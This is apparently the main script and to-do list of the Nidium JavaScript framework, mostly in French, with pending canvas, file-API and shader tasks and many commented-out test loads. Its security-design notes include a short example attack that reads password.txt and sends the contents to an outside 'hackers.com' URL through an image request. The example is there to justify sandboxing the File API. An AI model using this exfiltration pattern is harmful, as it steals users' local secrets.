/*
	Today :
		- hang si NML est invalid
		- bug des gradients (crash)


		- donner texture du dessous au shader;
		- canvas.blur(0, 1 ... 4);


	CANVAS :
		- canvas.toArrayBuffer();
		- window.canvas.snapshot(x, y, w, h);
		- import des fontes


	SECURITY DESIGN :
		- restraindre API File dans le dossier definie par localFileAccess
		- les appels à File.read("config.bin") --> dist/shared/config.bin

		- Nidium Malicious Bacon Attack :
			var m = File.read("password.txt", function(data, size){
				var i = new Image();
				t.src = "http://www.hackers.com/content="+URLencode(data);
			});

	FINITIONS
		- Callback d'érreur si le fichier ne peux pas être ouvert (404 http, fichier local inexistant, etc..)


	IMPACT SIGNIFICATIF :
		- Gestion du cache

	THREADS AND WORKER
		- thread crash
		- Synchronous File API in Thread
		- API Worker + rajouter include (voir ça https://github.com/astro/bitford/blob/master/src/sha1-worker.js)

	STEALTH INVISIBLE MODE :
		- 512Mo Ramdisk
		- Cleanup Destruction on quit

	COMPLEXE : 
		- scale

	VERY LOW PRIORITY : 
		- ctx.outlineBlur = 5;
		- ctx.outlineColor = "blue";
		- nss can not be empty and must have minimum {} in it
		- subtlepatterns.com : contacter (DONE) et rajouter le crédit
		- window.resize

------
DONE :
------

	DAY 6:
		- NML basics + include
		- fixer la console
		- showFPS(true) crash au refresh

	DAY 5:
	- window.storage.set (sync)
	- window.storage.get (sync)

	DAY 4:
	- shader ne suit pas le coin haut gauche du layer (DONE)
	- faire que attachFragmentShader tiennent compte du padding (DONE)
	- Work with Nico : crash au start sur linux (maybe font / skia)
	- Bug Gradient UIOption (DONE)
	- cabler window.devicePixelRatio (WIP)

	DAY 3:
	- Stream API: getFileSize (distant + locaux) (DONE)
	- Stream API: seek (distant + locaux) (DONE)
	- Stream API: Implémenter NativeStream::stop() (DONE)
	- cabler canvas.attachFragmentShader(); (DONE)
	- cabler canvas.detachFragmentShader(); (DONE)

	DAY 2
	- renommer Native.canvas en window.canvas (main canvas)
	- Stream API Design + WIP

	DAY 1
	- corriger textAlign vertical (center) (DONE)
	- renommer ctx.fontType en ctx.fontFamily (DONE)
	- window.requestAnimationFrame; (DONE)
	- measureText.width (DONE)
	- nml : <viewport>1024x768</viewport> (DONE)
	- nml est maintenant parsé avant le lancement (DONE)

	OLD
	- Image() et File() file relative to nml : (DONE)
	- document.location.href = "fdsf/view.nml"; (DONE)
	- contextmenu window.mouseX, window.mouseY (DONE)
	- radial gradient : fail (DONE)
	- button down rotation : fail (DONE)
	- textAlign vertical (ALMOST DONE)

*/

document.background = "#333333";
//load("sample.js");

//load("applications/_tests/timers.js");
//load("applications/_tests/arc.js");
//load("applications/_tests/canvas.js");
//load("applications/_tests/sockets.client.js");
//load("applications/_tests/sockets.server.js");
//load("applications/_tests/tasks.js");

//load("applications/components/hello.js");
//load("applications/components/motion.js");
//load("applications/components/tabs.js");
//load("applications/components/profiler.js"); // FIXE ME
//load("applications/components/windows.js");
//load("applications/components/dropdown.js");
//load("applications/components/buttons.js");
//load("applications/components/sliders.js");
//load("applications/components/scrollbars.js");
//load("applications/components/modal.js");
//load("applications/components/threads.js"); // crash si vidage console
//load("applications/components/tooltips.js");
//load("applications/components/animation.js");
//load("applications/components/flickr.js");
//load("applications/components/http.js");
//load("applications/components/zip.js");

//load("applications/components/text.js"); // FAIL
//load("applications/components/__zzz.js");

/* CANVAS TESTS (SANS NATIVE FRAMEWORK)*/

//load("applications/canvas/water.js"); // fail
//load("applications/canvas/bluewheel.js"); // FAIL (GlobalComposite)
//load("applications/canvas/sand.js"); // OK
//load("applications/canvas/cube.js"); // perf OK
//load("applications/canvas/cubewall.js"); // perf OK
//load("applications/canvas/flamme.js"); // OK
//load("applications/canvas/particles.js"); // perf OK
//load("applications/canvas/text.js"); // FAIL (GlobalComposite)
//load("applications/canvas/shader.js"); // OK

//load("applications/components/flickr.js");


/* UNIT TESTS */

	//load("applications/_tests/arc.js");
	//load("testArc.js");
	//load("testRetina.js");


/* MEDIA API */

	//load("applications/audio/test.js"); // OK
	//load("applications/audio/mixer.js"); // OK
	//load("applications/audio/dsp.js"); // OK
	//load("applications/media/video.js"); // OK

/* FILE API */

	//load("applications/components/file.basic.js");
	//load("applications/components/file.advanced.js");


/* SHADERS */

	//load("applications/components/shader.js"); // OK
	//load("applications/components/shader.basic.js"); // TODO : relative path to app
	load("applications/components/shader.advanced.js"); // TODO : relative path to app


/*

document.nss.add({
	".foobar" : {
		top : 30,
		left : 300,
		width : 450,
		height : 300,
		background : "red"
	},

	".foobar:hover" : {
		background : "#222222",
		radius : 4,
		width : 450,
		height : 80
	},

	".foobar:disabled" : {
		background : "#FF00FF",
		radius : 4,
		width : 450,
		height : 80
	},

	".foobar:disabled+hover" : {
		background : "#0000FF"
	}
});
*/

/*

var txt = new UIButton(document).center();
txt.background = "red";
txt.selected = true;

var o = new UILabel(document).center().move(45, 0);
o.background = "white";
o.label = "Mama's gonna snatch"

txt.className = "foobar";
txt.hover = true;
txt.disabled = true;
*/


/* TUTORIALS */

	//load("applications/tutorials/01.hello.js");
	//load("applications/tutorials/02.buttons.js");
	//load("applications/tutorials/03.events.js");
	//load("applications/tutorials/04.motion.js");
	//load("applications/tutorials/11.post.js");

/* Unfinished */

	//load("applications/components/splines.js"); // LENTEUR ABOMINABLE
	//load("applications/components/diagrams.js");



/* -- Native Debugger ------------------ */

//load("applications/NatBug.nap");

